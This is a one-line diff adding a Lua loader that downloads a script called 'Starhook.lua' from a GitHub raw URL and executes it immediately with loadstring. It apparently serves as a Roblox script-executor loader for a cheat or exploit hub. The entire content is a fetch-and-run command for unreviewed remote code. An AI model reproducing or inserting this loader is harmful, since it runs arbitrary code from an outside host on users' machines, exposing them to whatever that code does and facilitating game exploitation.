@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jakeyyy67/Starhook/refs/heads/main/Starhook.lua"))()
